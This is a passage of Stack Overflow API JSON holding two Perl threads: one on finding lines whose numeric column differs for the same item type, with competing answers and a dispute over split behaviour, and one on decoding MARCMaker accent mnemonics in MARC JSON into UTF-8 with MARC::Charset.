6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520779950, "post_id": 49220287, "comment_id": 85446117, "body": "And I wrote the code when the answer wasn&#39;t edited yet to include this statement <i>For each distinct value of the second column, I want to print any line where the number in the third column is different.</i> , which changed the requirement."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520780096, "post_id": 49220287, "comment_id": 85446161, "body": "The error of using <code>&#47;\\s+&#47;</code> instead of <code>&quot; &quot;</code>, which will fail if there is any leading whitespace on the input line. Even the OP&#39;s code allows for that!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520780387, "post_id": 49220287, "comment_id": 85446232, "body": "That&#39;s my edit. The original post was a mess, and said <i>&quot;Then print only the mismatched number line&quot;</i>, and the example shows <code>A car 69</code> being printed."}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520780565, "post_id": 49220287, "comment_id": 85446293, "body": "I don&#39;t see any leading whitespace in the OP data and nothing suggests it is going to be there. You are trying to add uncommon corner cases to the problem where it&#39;s not necessary. I may well do the same and say that the <code>&quot; &quot;</code> will fail if the letter column contains empty value, which is a corner case also."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520781041, "post_id": 49220287, "comment_id": 85446455, "body": "If you want to allow for embedded white space then you need to ask for more precise details of the format, and in that case your variant won&#39;t work either. It is far better to assume that the OP&#39;s code is a reasonable indication of what may be there. It is commonly recognised that <code>split &quot; &quot;, $_</code> is the most appropriate way to split a string on white space: that is why it is the default for <code>split</code>. Please stop arguing with me for the sake of saving face."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520781146, "post_id": 49220287, "comment_id": 85446492, "body": "Your code also prints <code>A house 179</code> which shouldn&#39;t be in the output."}, {"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 1, "creation_date": 1520789238, "post_id": 49220287, "comment_id": 85449354, "body": "I get from your code <code>A house 179 C food 85 B car 136</code> which only correctly finds the different record if it follows the duplicates. <code>car 136</code> should be <code>car 69</code>"}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "reply_to_user": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 0, "creation_date": 1520791261, "post_id": 49220287, "comment_id": 85449999, "body": "@ChrisCharley I wrote my code with the assumption that the OP needed the last line where the number differed from previous line for the same object. So for the <code>car</code> it should be the second <code>B car 136</code> because it differs from previous <code>A car 69</code> (and we <i>do not take</i> the first column into account).   So far there were no indications from the OP that he wanted something else."}, {"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "edited": false, "score": 1, "creation_date": 1520792081, "post_id": 49220287, "comment_id": 85450271, "body": "Ok, that&#39;s the way you read it but in his desired output he had <code>C food 85 A car 69</code> so I assumed he wanted only the ones that differed from the like ones. His data sample leaves something to be desired."}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "edited": false, "score": 0, "creation_date": 1520792936, "post_id": 49220287, "comment_id": 85450562, "body": "Well in the editing history the first version didn&#39;t include <code>A car 69</code>.  That&#39;s what I based my code on. Anyway, the OP wanted the guidance, not the exact solution to the exact problem."}, {"owner": {"reputation": 29, "user_id": 9475065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd15baa3bf38f3e806f79bfc62cf1fe5?s=128&d=identicon&r=PG&f=1", "display_name": "Sonal", "link": "https://stackoverflow.com/users/9475065/sonal"}, "edited": false, "score": 0, "creation_date": 1521195586, "post_id": 49220287, "comment_id": 85637623, "body": "Could you please tell me how to get the output in this format.C food 85 not matching with A Food 75 , B food 75. it print for the same item(e.g Food) in one line by comparing their values."}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "reply_to_user": {"reputation": 29, "user_id": 9475065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd15baa3bf38f3e806f79bfc62cf1fe5?s=128&d=identicon&r=PG&f=1", "display_name": "Sonal", "link": "https://stackoverflow.com/users/9475065/sonal"}, "edited": false, "score": 0, "creation_date": 1521197126, "post_id": 49220287, "comment_id": 85638661, "body": "@Sonal You&#39;d better post another question with sample input data and desired results. See <a href=\"https://stackoverflow.com/editing-help\">editing help</a> about how to format a question for easier understanding. (You can also click on edit button of your question and see how the formatting was done)."}], "tags": [], "owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "is_accepted": false, "score": 0, "last_activity_date": 1520797579, "last_edit_date": 1520797579, "creation_date": 1520773542, "answer_id": 49220287, "question_id": 49219831, "link": "https://stackoverflow.com/questions/49219831/sort-the-column-values-and-search-the-value/49220287#49220287", "title": "Sort the column values and search the value", "body": "<p>Here are the pointers:</p>\n\n<p>First, you need to remember lines somewhere before outputting them.<br>\nSecond, you need to discard previously remembered line for the object according to the rules you set.<br>\nIn your case, the rule is to discard when the number for the object differs from the previous remembered.<br>\nBoth tasks can be accomplished with the <a href=\"https://perldoc.perl.org/perldata.html\" rel=\"nofollow noreferrer\">hash</a>.</p>\n\n<p>For each line:</p>\n\n<pre><code>    my ($letter, $object, $number)=split /\\s+/, $line;\n    if (!defined($hash{$object}) || $hash{$object}[0]!=$number) {\n      $hash{$object}=[$number, $line];\n    }\n</code></pre>\n\n<p>Third, you need to output the hash:</p>\n\n<pre><code>for my $object(keys %hash) {\n    print $hash{$object}[1];\n}\n</code></pre>\n\n<p>But there is the problem: a hash is an unordered structure, it won't return its keys in the order you put them into the hash.<br>\nSo, the fourth: you need to add the ordering to your hash data, which can be accomplished like this:</p>\n\n<pre><code>  $hash{$object}=[$number,$line,$.]; # $. is the row number over all the input files or STDIN, we use it for sorting\n</code></pre>\n\n<p>And in the output part you sort with the stored row number<br>\n(see <a href=\"http://perldoc.perl.org/functions/sort.html\" rel=\"nofollow noreferrer\">sort</a> for details about <code>$a</code>, <code>$b</code> variables):</p>\n\n<pre><code>for my $object(sort { $hash{$a}[2]&lt;=&gt;$hash{$b}[2] } keys %hash) {\n    print $hash{$object}[1];\n}\n</code></pre>\n\n<p><strong>Regarding the comments</strong></p>\n\n<p>I am certain that my code does not contain any errors.<br>\nIf we look at the question before it was edited by some high rep users, it states:  </p>\n\n<p>[cite]<br>\nNow where if Numeric column(Third) has different value (Where in 2nd column matches) ...Then print only the mismatched number line. example..<br>\n    <strong>A food 75</strong><br>\n    B car 136<br>\n    A car 69<br>\n    A house 179<br>\n    <strong>B food 75</strong><br>\n    B car 136<br>\n    <strong>C food 85</strong>  </p>\n\n<p>Example output (As number columns are not matching)<br>\n    <strong>C food 85</strong><br>\n[/cite]  </p>\n\n<p>I can only interpret that <code>print only the mismatched number line</code> as: to print the last line for the object where the number changed. That clearly matches the example the OP provided.  </p>\n\n<p>Even so, in my answer I addressed the possibility of misinterpretation, by stating that line omitting is done according to whatever rules the OP wants.<br>\nAnd below that I indicated what was the rule by that time <em>in my opinion</em>.<br>\nI think it well addressed the OP problem, because, after all, <em>the OP wanted the pointers</em>.  </p>\n\n<p>And now my answer is critiqued because it does not match the edited (long after and not by OP) requirements.  </p>\n\n<p>I disagree.</p>\n\n<p>Regarding the whitespace: specifying <code>/\\s+/</code> for split <em>is not an error here</em>, despite of some comments trying to assert that.<br>\nWhile I agree that <code>\" \"</code> is common for split, I would disagree that there are a lot of cases where you <em>must</em> use <code>\" \"</code> instead of <code>/\\s+/</code>.<br>\n<code>/\\s+/</code> is a regular expression which is the conventional argument for split, while <code>\" \"</code> is the shorthand, that actually masks the meaning.<br>\nWith that I decided to use explicit <code>split /\\s+/, $line</code> in my example instead of just <code>split \" \", $line</code> or just <code>split</code> <em>specifically to show the innerworkings of perl</em>.  </p>\n\n<p>I think it is important to any one new to perl.</p>\n\n<p>It is perfectly ok to use <code>/\\s+/</code>, but be careful if you expect to have leading whitespace in your data, consult <code>perldoc -f split</code> and decide whether <code>/\\s+/</code> suits your needs or not. </p>\n"}, {"comments": [{"owner": {"reputation": 29, "user_id": 9475065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd15baa3bf38f3e806f79bfc62cf1fe5?s=128&d=identicon&r=PG&f=1", "display_name": "Sonal", "link": "https://stackoverflow.com/users/9475065/sonal"}, "edited": false, "score": 0, "creation_date": 1521128705, "post_id": 49225955, "comment_id": 85609488, "body": "Thankyou @borodin  it really help and work like a charm"}, {"owner": {"reputation": 29, "user_id": 9475065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd15baa3bf38f3e806f79bfc62cf1fe5?s=128&d=identicon&r=PG&f=1", "display_name": "Sonal", "link": "https://stackoverflow.com/users/9475065/sonal"}, "edited": false, "score": 0, "creation_date": 1521177965, "post_id": 49225955, "comment_id": 85628919, "body": "Hi @borodin how to get output in this format. if i have same input A food 75 B car 136 A car 69 A house 179 B food 75 B car 136 C food 85  output want in below format. C food 85 not match with A food 75, B food 75 A car 69 not match with  B car 136"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1520808587, "creation_date": 1520808587, "answer_id": 49225955, "question_id": 49219831, "link": "https://stackoverflow.com/questions/49219831/sort-the-column-values-and-search-the-value/49225955#49225955", "title": "Sort the column values and search the value", "body": "\n\n<p>As far as I can tell from your question, you want a list of all the lines where there is an \"odd one out\" with the same item type and a different number in the third column from all the rest</p>\n\n<p>I think this is what you need</p>\n\n<p>It reads all the data into hash <code>%data</code>, so that <code>$data{$type}{$n}</code> is a (reference to an) array of all the data lines that use that object type and number</p>\n\n<p>Then the hash is scanned again, looking for and printing all instances that have only a single line with the given type/number <em>and</em> where there are other values for the same object type (otherwise it would be the only entry and not an \"odd one out\")</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse autodie;\n\nmy %data;\n\nopen my $fh, '&lt;', 'data.txt';\n\nwhile ( &lt;$fh&gt; ) {\n    my ( $label, $type, $n) = split;\n    push @{ $data{$type}{$n} }, $_;\n}\n\nfor my $type ( keys %data ) {\n\n    my $items = $data{$type};\n\n    next unless keys %$items &gt; 1;\n\n    for my $n ( keys %$items ) {\n        print $items-&gt;{$n}[0] if @{ $items-&gt;{$n} } == 1;\n    }\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>C food 85\nA car 69\n</code></pre>\n\n<p>Note that this may print multiple lines for a given object type if the input looks like, say</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>B car 22\nA car 33\nB car 136\nC car 136\n</code></pre>\n\n<p>This has two \"odd ones out\" that appear only once for the given object type, so both <code>B car 22</code> and <code>A car 33</code> will be printed</p>\n"}], "owner": {"reputation": 29, "user_id": 9475065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd15baa3bf38f3e806f79bfc62cf1fe5?s=128&d=identicon&r=PG&f=1", "display_name": "Sonal", "link": "https://stackoverflow.com/users/9475065/sonal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1521200838, "creation_date": 1520770168, "last_edit_date": 1521200838, "question_id": 49219831, "link": "https://stackoverflow.com/questions/49219831/sort-the-column-values-and-search-the-value", "title": "Sort the column values and search the value", "body": "\n\n<p>Input to my script is this file which contains data as below.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>A food 75\nB car 136\nA car 69\nA house 179\nB food 75\nC car 136\nC food 85\n</code></pre>\n\n<p>For each distinct value of the second column, I want to print any line where the number in the third column is different.</p>\n\n<p>Example output</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>C food 85 \nA car 69 \n</code></pre>\n\n<p>Here is my Perl code.</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#! /usr/local/bin/perl\n\nuse strict;\nuse warning;\n\nmy %data = ();\n\nopen FILE, '&lt;', 'data.txt' or die $!;\nwhile ( &lt;FILE&gt; ) {\n    chomp;\n    $data{$1} = $2 while /\\s*(\\S+),(\\S+)/g;\n}\nclose FILE;\n\nprint $_, '-', $data{$_}, $/ for keys %data;\n</code></pre>\n\n<p>I am able to print the hash keys and values, but not able to get the desired output.</p>\n\n<p>Any pointers on how to do that using Perl?</p>\n"}, {"tags": ["json", "perl", "marc"], "answers": [{"tags": [], "owner": {"reputation": 45, "user_id": 842354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/VOhhh.png?s=128&g=1", "display_name": "jorol", "link": "https://stackoverflow.com/users/842354/jorol"}, "is_accepted": false, "score": 1, "last_activity_date": 1520861035, "last_edit_date": 1520861035, "creation_date": 1520860730, "answer_id": 49236278, "question_id": 49219741, "link": "https://stackoverflow.com/questions/49219741/does-anyone-recognize-this-marc-json-format/49236278#49236278", "title": "does anyone recognize this MARC JSON format?", "body": "<p>This is an encoding problem. The <a href=\"https://metacpan.org/pod/MARC::Record#encoding()\" rel=\"nofollow noreferrer\">record leader</a> says that the data is encoded in <a href=\"https://en.wikipedia.org/wiki/MARC-8\" rel=\"nofollow noreferrer\">MARC-8</a>. Your JSON data should be encoded in UTF-8. <code>_maker2char()</code> uses <a href=\"https://metacpan.org/source/EIJABB/MARC-File-MARCMaker-0.05/lib/MARC/File/MARCMaker.pm#L581\" rel=\"nofollow noreferrer\"><code>usmarc_default()</code></a>, which maps the mnemonic accent encodings to MARC-8 encoded chars. Use MARC::Charset to convert the data to UTF-8. This should work:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse 5.014;\n\nuse utf8;\nuse strict;\nuse autodie;\nuse warnings;\n\nuse MARC::File::MARCMaker;\nuse MARC::Charset qw(marc8_to_utf8);\n\nmy $data = q{This is a test of diacritics like the uppercase Polish L in {Lstrok}{acute}od{acute}z\nthe uppercase Scandinavia O in {Ostrok}st\nthe uppercase D with crossbar in {Dstrok}uro\nthe uppercase Icelandic thorn in {THORN}ann\nthe uppercase digraph AE in {AElig}gir\nthe uppercase digraph OE in {OElig}uvres\nthe soft sign in rech{softsign}\nthe middle dot in col{middot}lecci{acute}o\nthe musical flat in F{flat}\nthe patent mark in Frizbee{reg}\nthe plus or minus sign in {plusmn}54%\nthe uppercase O-hook in B{Ohorn}\nthe uppercase U-hook in X{Uhorn}A\nthe alif in mas{mlrhring}alah\nthe ayn in {mllhring}arab\nthe lowercase Polish l in W{lstrok}oc{lstrok}aw\nthe lowercase Scandinavian o in K{ostrok}benhavn\nthe lowercase d with crossbar in {dstrok}avola\nthe lowercase Icelandic thorn in {thorn}ann\nthe lowercase digraph ae in v{aelig}re\nthe lowercase digraph oe in c{oelig}ur\nthe lowercase hardsign in s{hardsign}ezd\nthe Turkish dotless i in masal{inodot}\nthe British pound sign in {pound}5.95\nthe lowercase eth in ver{eth}ur\nthe lowercase o-hook (with pseudo question mark) in S{hooka}{ohorn}\nthe lowercase u-hook in T{uhorn} D{uhorn}c\nthe pseudo question mark in c{hooka}ui\nthe grave accent in tr{grave}es\nthe acute accent in d{acute}esir{acute}ee\nthe circumflex in c{circ}ote\nthe tilde in ma{tilde}nana\nthe macron in T{macr}okyo\nthe breve in russki{breve}i\nthe dot above in {dot}zaba\nthe dieresis (umlaut) in L{uml}owenbr{uml}au\nthe caron (hachek) in {caron}crny\nthe circle above (angstrom) in {ring}arbok\nthe ligature first and second halves in d{llig}i{rlig}ad{llig}i{rlig}a\nthe high comma off center in rozdel{rcommaa}ovac\nthe double acute in id{dblac}oszaki\nthe candrabindu (breve with dot above) in Ali{candra}iev\nthe cedilla in {cedil}ca va comme {cedil}ca\nthe right hook in viet{ogon}a\nthe dot below in te{dotb}da\nthe double dot below in {under}k{under}hu{dbldotb}tbah\nthe circle below in Sa{dotb}msk{ringb}rta\nthe double underscore in {dblunder}Ghulam\nthe left hook in Lech Wa{lstrok}{commab}esa\nthe right cedilla (comma below) in kh{rcedil}ong\nthe upadhmaniya (half circle below) in {breveb}humantu{caron}s\ndouble tilde\nfirst and second halves in {ldbltil}n{rdbltil}galan\nhigh comma (centered) in g{commaa}eotermika.\nAlg{grave}ebres de Von Neumann\n{grave}e\n{ring}Z\n{ringb}h\n{ringb}s\n{rlig}a\n{rlig}A\n};\n\nmy $marc_charset = MARC::File::MARCMaker::usmarc_default();\nmy $marc8 = MARC::File::MARCMaker::_maker2char($data, $marc_charset);\n\n# prepare STDOUT for utf8\nbinmode(STDOUT, 'utf8');\n\n# convert marc8 to utf8\nmy $utf8 = marc8_to_utf8($marc8);\n\nsay $utf8;\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>This is a test of diacritics like the uppercase Polish L in \u0141o\u0301dz\u0301\nthe uppercase Scandinavia O in \u00d8st\nthe uppercase D with crossbar in \u0110uro\nthe uppercase Icelandic thorn in \u00deann\nthe uppercase digraph AE in \u00c6gir\nthe uppercase digraph OE in \u0152uvres\nthe soft sign in rech\u02b9\nthe middle dot in col\u00b7leccio\u0301\nthe musical flat in F\u266d\nthe patent mark in Frizbee\u00ae\nthe plus or minus sign in \u00b154%\nthe uppercase O-hook in B\u01a0\nthe uppercase U-hook in X\u01afA\nthe alif in mas\u02bcalah\nthe ayn in \u02bbarab\nthe lowercase Polish l in W\u0142oc\u0142aw\nthe lowercase Scandinavian o in K\u00f8benhavn\nthe lowercase d with crossbar in \u0111avola\nthe lowercase Icelandic thorn in \u00feann\nthe lowercase digraph ae in v\u00e6re\nthe lowercase digraph oe in c\u0153ur\nthe lowercase hardsign in s\u02baezd\nthe Turkish dotless i in masal\u0131\nthe British pound sign in \u00a35.95\nthe lowercase eth in ver\u00f0ur\nthe lowercase o-hook (with pseudo question mark) in S\u01a1\u0309\nthe lowercase u-hook in T\u01b0 D\u01b0c\nthe pseudo question mark in cu\u0309i\nthe grave accent in tre\u0300s\nthe acute accent in de\u0301sire\u0301e\nthe circumflex in co\u0302te\nthe tilde in man\u0303ana\nthe macron in To\u0304kyo\nthe breve in russkii\u0306\nthe dot above in z\u0307aba\nthe dieresis (umlaut) in Lo\u0308wenbra\u0308u\nthe caron (hachek) in c\u030crny\nthe circle above (angstrom) in a\u030arbok\nthe ligature first and second halves in di\u0361adi\u0361a\nthe high comma off center in rozdelo\u0315vac\nthe double acute in ido\u030bszaki\nthe candrabindu (breve with dot above) in Alii\u0310ev\nthe cedilla in c\u0327a va comme c\u0327a\nthe right hook in vieta\u0328\nthe dot below in ted\u0323a\nthe double dot below in k\u0332h\u0332ut\u0324bah\nthe circle below in Sam\u0323skr\u0325ta\nthe double underscore in G\u0333hulam\nthe left hook in Lech Wa\u0142e\u0326sa\nthe right cedilla (comma below) in kho\u031cng\nthe upadhmaniya (half circle below) in h\u032eumantus\u030c\ndouble tilde\nfirst and second halves in n\u0360galan\nhigh comma (centered) in ge\u0313otermika.\nAlge\u0300bres de Von Neumann\ne\u0300\nZ\u030a\nh\u0325\ns\u0325\na\nA\n</code></pre>\n"}], "owner": {"reputation": 2166, "user_id": 285364, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/69d9207065febf40940eb74a3b76222e?s=128&d=identicon&r=PG", "display_name": "Vladimir Alexiev", "link": "https://stackoverflow.com/users/285364/vladimir-alexiev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1520877567, "creation_date": 1520769514, "last_edit_date": 1520877567, "question_id": 49219741, "link": "https://stackoverflow.com/questions/49219741/does-anyone-recognize-this-marc-json-format", "title": "does anyone recognize this MARC JSON format?", "body": "<p>Does anyone recognize this format (see paste at bottom)? It's from R\u00e9pertoire de vedettes-mati\u00e8re (RVM).\nIt's neither of these two:</p>\n\n<ul>\n<li><a href=\"https://metacpan.org/pod/Catmandu::Exporter::MARC::MiJ\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/Catmandu::Exporter::MARC::MiJ</a></li>\n<li><a href=\"http://search.cpan.org/~cfouts/MARC-File-JSON-0.003/lib/MARC/File/JSON.pm\" rel=\"nofollow noreferrer\">http://search.cpan.org/~cfouts/MARC-File-JSON-0.003/lib/MARC/File/JSON.pm</a></li>\n</ul>\n\n<p>I can program in Perl, also posted as <a href=\"https://github.com/LibreCat/Catmandu-MARC/issues/88\" rel=\"nofollow noreferrer\">https://github.com/LibreCat/Catmandu-MARC/issues/88</a>.</p>\n\n<p>I can hack it with just XS::JSON but I don't know how to deal with this weird accent encoding (a few sample lines shown from 325):</p>\n\n<pre><code>{grave}e\n{ring}Z\n{ringb}h\n{ringb}s\n{rlig}a\n{rlig}A\n</code></pre>\n\n<p>Here's the strange MARC JSON:</p>\n\n<pre><code>{\n\"rows\" : [\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"LDR\",\n    \"Indicators\" : \"\",\n    \"Content\" : \"00533nz   2200205n  4500\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"001\",\n    \"Indicators\" : \"\\\"  \\\"\",\n    \"Content\" : \"201-0000001\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"005\",\n    \"Indicators\" : \"\\\"  \\\"\",\n    \"Content\" : \"20121025110000.0\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"008\",\n    \"Indicators\" : \"\\\"  \\\"\",\n    \"Content\" : \"790704\\\\nfanvnnbabn\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\ana\\\\\\\\\\\\\\\\\\\\\\\\\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"016\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$a0509B3366\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"035\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$a(ISM)8013850\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"035\",\n    \"Indicators\" : \"9\\\\\",\n    \"Content\" : \"$a201-0000001\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"040\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$aCaQQLa$bfre\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"150\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$aAlg{grave}ebres de Von Neumann\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"450\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$wnne$aVon Neumann, Alg{grave}ebres de\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"450\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$aW*-alg{grave}ebres\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"550\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$wg$aC*-alg{grave}ebres\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"550\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$wg$aEspace de Hilbert\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"697\",\n    \"Indicators\" : \"\\\\\\\\\",\n    \"Content\" : \"$amm.\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"750\",\n    \"Indicators\" : \"\\\\7\",\n    \"Content\" : \"$aVon Neumann, Alg{grave}ebres de$2ram\"\n}\n,\n{\n    \"RecordNumber\" : \"1\",\n    \"Tag\" : \"750\",\n    \"Indicators\" : \"\\\\0\",\n    \"Content\" : \"$aVon Neumann algebras\"\n}\n]\n}\n</code></pre>\n\n<p>ADDED: this accent encoding is from MARCmkr. I used the following:</p>\n\n<pre><code>use MARC::File::MARCMaker; # https://metacpan.org/pod/MARC::File::MARCMaker\n# for some reason can't be found by module name, so use:\n# cpanm http://www.cpan.org/authors/id/E/EI/EIJABB/MARC-File-MARCMaker-0.05.tar.gz\nmy $marc_charset = MARC::File::MARCMaker::usmarc_default();\n$content = MARC::File::MARCMaker::_maker2char ($content, $marc_charset);\n</code></pre>\n\n<p>But when I test it eg on this text <a href=\"https://github.com/gmcharlt/marc-perl/blob/e8e0ecc92946d6dcb3c2270706041a30eff0f68d/marc-marcmaker/t/marcmaker.t#L92\" rel=\"nofollow noreferrer\">https://github.com/gmcharlt/marc-perl/blob/e8e0ecc92946d6dcb3c2270706041a30eff0f68d/marc-marcmaker/t/marcmaker.t#L92</a>, it just translates the accents/ligatures to XML entities. I tried opening the translated text in a browser: some entities are not interpreted, and none has accented the next char. So I guess I now need to use some \"XML to Unicode\" module to finish the translation</p>\n\n<pre><code>This a test of diacritics like the uppercase Polish L in\n\u0141\u00b4od\u00b4z, the uppercase Scandinavia O in &amp;Ostrok;st, the\nuppercase D with crossbar in \u0110uro, the uppercase Icelandic\nthorn in \u00deann, the uppercase digraph AE in \u00c6gir, the\nuppercase digraph OE in \u0152uvres, the soft sign in\nrech&amp;softsign;, the middle dot in col\u00b7lecci\u00b4o, the musical\nflat in F\u266d, the patent mark in Frizbee\u00ae, the plus or minus\nsign in \u00b154%, the uppercase O-hook in B&amp;Ohorn;, the\nuppercase U-hook in X&amp;Uhorn;A, the alif in\nmas&amp;mlrhring;alah, the ayn in &amp;mllhring;arab, the lowercase\nPolish l in W\u0142oc\u0142aw, the lowercase Scandinavian o in\nK&amp;ostrok;benhavn, the lowercase d with crossbar in \u0111avola,\nthe lowercase Icelandic thorn in \u00feann, the lowercase digraph\nae in v\u00e6re, the lowercase digraph oe in c\u0153ur, the lowercase\nhardsign in s&amp;hardsign;ezd, the Turkish dotless i in masal\u0131,\nthe British pound sign in \u00a35.95, the lowercase eth in\nver\u00f0ur, the lowercase o-hook (with pseudo question mark) in\nS&amp;hooka;&amp;ohorn;, the lowercase u-hook in T&amp;uhorn; D&amp;uhorn;c,\nthe pseudo question mark in c&amp;hooka;ui, the grave accent in\ntr`es, the 